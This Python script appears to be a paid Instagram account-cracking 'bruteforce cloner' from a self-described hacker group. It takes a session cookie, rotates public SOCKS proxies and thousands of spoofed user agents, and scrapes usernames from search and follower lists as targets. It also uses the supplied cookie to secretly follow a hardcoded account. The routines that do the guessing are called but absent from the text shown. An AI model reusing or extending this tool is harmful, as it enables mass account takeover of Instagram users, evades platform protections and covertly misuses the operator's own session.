###----------[ IMPORT MODULE ]----------###
import requests, re, base64, os, json, time, sys, hashlib, hmac, uuid, random, datetime, calendar
from concurrent.futures import ThreadPoolExecutor as Modol
from datetime import datetime

###----------[ IMPORT MODULE RICH ]----------###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT ]----------###
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
P = '\x1b[0m'    # WARNA MATI
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
G = '\x1b[1;32m'
###----------[ WARNA RICH ]----------###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ INSTALL MODULE ]----------###
try:
        import rich
except ImportError as e:
        prints(f" {H2}•{P2}installing missing {H2}{e.name}, {P2}modules...")
        os.system(f"python -m pip install {e.name} &> /dev/null")
        os.system(f"python -m pip install requests &> /dev/null")

###----------[ GLOBAL NAMA ]----------###
method, ugentku, iyh = [], [], {}
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; DARKEST-OWL-HACKERS\x07')

###----------[ AUTO CREATE FOLDER ]----------###
try:os.mkdir("data")
except:pass
try:os.mkdir("assets")
except:pass
try:os.mkdir("results")
except:pass

###----------[ CONVERT BULAN ]----------###
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
AkunOK = f"OK-{days}-{reall}-{year}.txt"
AkunCP = f"CP-{days}-{reall}-{year}.txt"

###----------[ WARNA TEMA ]----------###
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#00FF00]"
	color_table = "#FF0000"

###----------[ IP ADDRESS ]----------###
try:
	IP = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	if "Nigeria" not in negara:
	   prints(Panel(f"""{P2}this script only work in NIGERIA!!, please search FOR another script""",width=80,padding=(0,6),style=f"{color_table}"))
	   time.sleep(3);exit()
except requests.exceptions.ConnectionError:
	print(f"{M} internet problem")
	time.sleep(3);exit()

###----------[ PROXIES ]----------###
try:
    with requests.Session() as ses:
        _url = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f"{G}•{M} internet problem")
    time.sleep(0.3);exit()

class Instagram:

    def __init__(self):
 	
        self.ses = requests.Session()
        self.ok, self.cp = [], []
        self.id, self.lo = [], 0
        self.gett()
        
    #    self.Rayan = self.ses.get("https://api.countapi.xz/hit/RayanXD/visits").json()["value"]
        self.menu()

    def hapus_coki(self):
        try:os.remove("data/Cookieig.txt")
        except:pass

    def timeLine(self):
       now = datetime.now()
       hours = now.hour
       if 4 <= hours < 12:timenow = "Selamat Pagi"
       elif 12 <= hours < 15:timenow = "Selamat Siang"
       elif 15 <= hours < 18:timenow = "Selamat Sore"
       else:timenow = "Selamat Malam"
       return timenow

    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
    
    def loadCookie(self, Instagram):
        anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
        for i in range(50):
            time.sleep(0.1)
            sys.stdout.write(f"\r {H}•{M} CHECKING FOR LOGIN... " + anim[i % len(anim)] +"\x1b[0m ")
            sys.stdout.flush()
        print("")

    def loadUgents(self, Instagram):
        anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
        for i in range(50):
            time.sleep(0.1)
            sys.stdout.write(f"\r {H}•{N} INJECTING USERAGENT... " + anim[i % len(anim)] +"\x1b[0m ")
            sys.stdout.flush()
        print("")

    for xc in range(10000):
        rr = random.randint
        rc = random.choice
        dpi = ['133','320','515','160','640','240','120','800','480','225','768','216','1024']
        i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
        pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
        UserAgents1 = f"Instagram {str(rc(i_version))} Android (23/{str(rr(9,12))}; {str(rc(dpi))}dpi; {str(rc(pxl_phone))}; vivo; vivo Xplay5S; PD1516A; qcom; ru; 99640911)"
        UserAgents2 = f"Mozilla/5.0 (Linux; Android 9; {str(rr(9,12))}; 7DY Build/PPR1.180610.011; wv).{str(rr(111111,199999))}.020; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,3999))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 271.1.0.21.84 Android (28/9; 160dpi; 600x976; mediacom; 7DY; 7DY; mt8321; it_IT; 448943797).{str(rr(51111,59999))}AP"
        UserAgents3 = f"Mozilla/5.0 (Linux; Android 11.0; {str(rr(9,12))}; iCherry C251 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,3999))}.{str(rr(75,150))} UCBrowser/{str(rr(7,13))}.4.0.{str(rr(1300,1999))} Mobile Safari/537.36"
        ugent = str(rc([UserAgents1, UserAgents2, UserAgents3]))
        ugentku.append(ugent)
    
    def logoo1(self):
        self.clear()
        #prints(f"{M2}⬤{K2}⬤{H2}⬤{reset}")
        print(f""" 
 \033[1;32m ::::::::   ::::::::  ::::    ::: 
\033[1;32m :+:    :+: :+:    :+: :+:+:   :+: 
\033[1;97m +:+        +:+        :+:+:+  +:+ 
\033[1;97m +#++:++#++ +#++:++#++ +#+ +:+ +#+ 
\033[1;97m        +#+        +#+ +#+  +#+#+# 
\033[1;32m #+#    #+# #+#    #+# #+#   #+#+# 
\033[1;32m  ########   ########  ###    #### 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;30m[]\33[mNAME   | \33[1;32mINSTSGRAM MULTI BRUTEFORCE CLONER
\33[1;30m[]\33[mTEAM   | \33[1;32mDARKEST OWL HACKERS 
\33[1;30m[]\33[mOWNER  | \33[1;32m[MICHAEL],,,[SHALOM],,,[OMOTOSHO]
\33[1;30m[]\33[mGMAIL    | \33[1;32mDARKIEST OWL HACKERS@PROTON.ME
\33[1;30m[]\33[mSTATUS | \33[1;32mPAID
\33[1;30m[]\33[mGITHUB | \33[1;33mDARKIEST OWL HACKERS
\33[1;30m[]\33[mWHATSAPP | \33[1;32m+234---
\33[1;30m[]\33[mFACEBOOK | \33[1;32m[MICHAEL],[SHALOM],[OMOTOSHO]
\33[1;30m[]\33[mVERSION  | \33[1;34m1.0
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    def logoo(self):
        self.clear()
        print(f"""
 \033[1;32m ::::::::   ::::::::  ::::    ::: 
\033[1;32m :+:    :+: :+:    :+: :+:+:   :+: 
\033[1;97m +:+        +:+        :+:+:+  +:+ 
\033[1;97m +#++:++#++ +#++:++#++ +#+ +:+ +#+ 
\033[1;97m        +#+        +#+ +#+  +#+#+# 
\033[1;32m #+#    #+# #+#    #+# #+#   #+#+# 
\033[1;32m  ########   ########  ###    #### 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;30m[]\33[mNAME   | \33[1;32mINSTSGRAM MULTI BRUTEFORCE CLONER
\33[1;30m[]\33[mTEAM   | \33[1;32mDARKEST OWL HACKERS 
\33[1;30m[]\33[mOWNER  | \33[1;32m[MICHAEL],,,[SHALOM],,,[OMOTOSHO]
\33[1;30m[]\33[mGMAIL    | \33[1;32mDARKIEST OWL HACKERS@PROTON.ME
\33[1;30m[]\33[mSTATUS | \33[1;32mPAID
\33[1;30m[]\33[mGITHUB | \33[1;33mDARKIEST OWL HACKERS
\33[1;30m[]\33[mWHATSAPP | \33[1;32m+234---
\33[1;30m[]\33[mFACEBOOK | \33[1;32m[MICHAEL],[SHALOM],[OMOTOSHO]
\33[1;30m[]\33[mVERSION  | \33[1;34m1.0
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                      """)

    

    def convert(self, xx, cok):
        try:
            id = self.ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}', cookies={"cookie":cok}, headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            xz = id["id"]
        except:pass
        return xz

    def ua_ig(self):
        return "Mozilla/5.0 (Linux; Android 8.1.0; 1AEC Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Safari/537.36 Instagram 282.0.0.22.119 Android (27/8.1.0; 160dpi; 800x1232; mediacom; 1AEC; 1AEC; mt6735; it_IT; 472967713)"

    def login(self):
        self.logoo1()
        print(f"\33[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"\033[1;32m[+] INSTAGRAM MBF NEEDS COOKIE") 
        coki = input(f"ENTER COOKIE : {H}")
  #      self.loadCookie(Instagram)
        if coki in ["", ""]:
            print(f"{H}•{N} {M} ENTER CORRECT COOKIE, ")
            time.sleep(3);self.login()
        try:
            id = re.search("ds_user_id=(\d+)", str(coki)).group(1)
            po = self.ses.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":self.ua_ig()},cookies={"cookie":coki})
            xx = json.loads(po.text)
            if "full_name" in str(xx):
                nama = xx["user"]["full_name"]
                ngtd = re.search("csrftoken=(.*?);", str(coki)).group(1);self.cook(ngtd, coki)
                open("data/Cookieig.txt", "w").write(coki)
                print(f"{G} LOGIN SUCCESSFUL{nama} {K} RUN AGAIN")
                time.sleep(3);exit()
            elif "challenge_required" in str(xx):
                print(f"{H}•{N} {K} ACCOUNT ON CP")
                time.sleep(3);self.login()
            else:
                print(f"{H}•{N}={M}Cookie Invalid  ")
                time.sleep(3);self.login()
        except (json.decoder.JSONDecodeError, KeyError, AttributeError):
            print(f" {H}•{N} cookie invalid")
            time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f"{H}•{N} {M} INTERNET PROBLEM")
            time.sleep(3);exit()

    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/hPcDPYHS").json())
        except requests.ConnectionError:
            self.logoo()
            print(f"{H}•{N} {M} Internet problem ")
            time.sleep(3);exit()

    def cook(self, tok, cok):
        try:
            head = {
                "Host": "i.instagram.com",
                "content-length": "0",
                "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                "x-ig-app-id": "1217981644879628",
                "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                "sec-ch-ua-mobile": "?1",
                "x-instagram-ajax": "1006447742",
                "viewport-width": "360",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "*/*",
                "user-agent": self.ua_ig(),
                "x-asbd-id": "198387",
                "save-data": "on",
                "x-csrftoken": tok,
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://www.instagram.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.instagram.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"
            }
            self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("57286292748"), headers = head, cookies={"cookie":cok})
        except requests.ConnectionError:
            self.logoo()
            print(f"{H}•{N} INTERNET PROBLEM")
            time.sleep(3);exit()

    def ua_Cok(self):
        rr = random.randint
        rc = random.choice
        real = str(rc(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","SM-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT"]))
        me = str(rc(["RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901"]))
        com = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"]))
        comi = "in_ID"
        dpi = str(rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
        pxl = str(rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
        igv = ("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
        igve = igv.split(",")
        andro = str(rc(["30/11","31/12","29/10"]))
        versi = str(rc(igve))
        return (f"Instagram {versi}  Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})")

    def menu(self):
        self.logoo()
     #   os.popen('data/play-audio/menu.mp3')
        try:
            lisen = open('data/lisensi.txt','r').read()
            met = self.ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key='+lisen).json()
            men = met['licenseKey']
            key = men['key'][0:11]
            tahun = men['expires'][0:4]
            buln = men['expires'][5:7]
            tanggal = men['expires'][8:10]
            bulan = bulan_ttl[buln]
            tahun1 = men['created'][0:4]
            buln1 = men['created'][5:7]
            tanggal1 = men['created'][8:10]
            bulan1 = bulan_ttl[buln1]
        except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
        try:
            sen = open("data/lisensi.txt","r").read()
            prem = f"{H2}Iya"
        except (KeyError,FileNotFoundError):
            prem = f"{M2}Tidak"
        try:
            coki = open("data/Cookieig.txt", "r").read()
            user = re.search('ds_user_id=(\d+)',str(coki)).group(1)
        except FileNotFoundError:
            self.login()
        try:
            xxxx = self.ses.get(f"https://i.instagram.com/api/v1/users/{user}/info/", headers={"user-agent":self.ua_ig()}, cookies={"cookie":coki}).json()["user"]
            nama = xxxx["full_name"]
            user = xxxx["username"]
            flow = xxxx["follower_count"]
            flos = xxxx["following_count"]
        except (json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
            print(f" {H}•{N} {M}Opsh account on cp")
            self.hapus_coki();time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f"{H}•{N} internet problem ")
            time.sleep(3);exit()
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{G} YOUR IP ADDRESS  {M} {IP}")
        print(f"{G} COUNTRY {negara}")
        urut = []
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f" ACCOUNT INFORMATION")
        print(f"{K} NAME  {nama}")
        print(f"{K} USERNAME {user}")
        print(f"{G} FOLLOWERS {flow}")
        print(f"{G} FOLLOWING {flos}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{G}[1] CLONE FROM USERNAME [GRAPH-API1]")
        print(f"{G}[2] CLONE FROM FOLLOWERS ssl pinning rotation")
        print(f"{G}[3] CLONE FROM FOLLOWING ")
        print(f"{G}[4] DUMP USERNAMES SAVED TO txt file")
        print(f"{G}[5] FILE CLONE USERNAMES txt method ")
        print(f"{G}[6] BRUTEFORCE INSTAGRAM ACCOUNT (With Pass list)")
        print(f"{G}[7] TO ENTER NEXT PAGE TYPE [menu]")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        pil = input(f"{G}[+] CHOOSE : {H}")
        
        if pil in ["", " "]:
            print(f" {H}•{N} invalid option")
            time.sleep(2);self.menu()
        
        elif pil in ["1", "01"]:
            print(f"{M} NOTE USERNAME MUST BE PUBLIC")
            nama = input(f"{M} ENTER USERNAME : {H}").split(",")
            print(f"{G}... to stop process type CTRL-C ")
            pexx = []
            try:
                for i in nama:
                    pexx.append(i)
                with Modol(max_workers=35) as bool:
                    for a in pexx:
                        bool.submit(self.search, f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={a}&rrank_token=0.35875757839675004&include_reel=true")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {H}•{N} {M} internet problem")
                time.sleep(3);exit()
            except (KeyError, json.decoder.JSONDecodeError):
                print(f"{M}SORRY USERNAME IS PRIVATE....");exit()
            self.mulai()
        
        elif pil in ["2", "02"]:
        	
            print(f"{M} NOTE USERNAME MUST BE PUBLIC")
            nama = input(f"{G}[+] ENTER USERNAME : {H}")
            if nama in ["", " "]:
                print(f" {H}•{N} INVALID OPTION ");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                print(f"{G}= to stop process type CTRL-C ")
                self.dump(xzxz, coki, "followers", "")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f"{H}•{N} Internet problem")
                time.sleep(3);exit()
            except (KeyError, UnboundLocalError):
                print(f"{M} SORRY THE account is private ");exit()
            self.mulai()
        
        elif pil in ["3", "03"]:
        	
            print(f"{M} NOTE USERNAME MUST BE PUBLIC")
            nama = input(f"{G}[+] ENTER USERNAME : {H}")
            if nama in ["", " "]:
                print(f" {H}•{N} INVALID OPTION ");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                print(f"{G}= to stop process type CTRL-C ")
                self.dump(xzxz, coki, "following", kos="")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f"{H}•{N} {M} Internet problem ")
                time.sleep(3);exit()
            except (KeyError, UnboundLocalError):
                print(f"{M} USERNAME IS PRIVATE");exit()
            self.mulai()
        
        elif pil in ["4", "04"]:
            try:
            	
                os.system("xdg-open https://wa.me/+2349130154748")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f"{H}•{N} {M} INTERNET PROBLEM")
                exit()
        
        elif pil in ["0","00"]:
        	
            print(f"{open('data/Cookieig.txt','r').read()}")
            xc = input(f"{M} ARE YOU SURE YOU WANT TO EXIT COOKIES [Y/N] {G}")
            if xc in ["",""]:
              print(f"{H}•{N} choose correct Option")
              time.sleep(3);self.menu()
            elif xc in ["Y","y"]:
                print(f"{H}•{N} SUCCESSFULLY LOGGED OUT")
                self.hapus_coki();time.sleep(3);exit()
            elif xc in ["T","t"]:
                self.menu()
            else:
                print(f"{H}•{M} invalid option")
                time.sleep(2);self.menu()
 

        elif pil in ["5", "05"]:
            try:
            	
                os.system("xdg-open https://wa.me/+2349130154748")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f"{H}•{N} {M} INTERNET PROBLEM")
                exit()
 
        elif pil in ["6", "06"]:
            try:
            	
                os.system("xdg-open https://wa.me/+2349130154748")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {H}•{N} {M} INTERNET PROBLEM")
                exit()
                              

    #    elif pil in ["bot","Bot","BOT"]:
 #           self.bots()        
        elif pil in ["menu","Menu","MENU"]:
            self.lains()
        else:
            print(f" {H}•{N} invalid Option")
            time.sleep(2);self.menu()
        
    
       
    def lains(self):
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{G}[1] CHECK RESULTS  ")
        print(f"{G}[2] JOIN OUR GROUP ")
        print(f"{G}[3] USERAGENT SETTING")
        print(f"{G}[4] CHANGE USERAGENT")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        
        ask = input(f"{G} CHOOSE : {H}")
        if ask in ["",""]:
           print(f"{H}={N} {M} invalid option")
           time.sleep(2);self.menu()
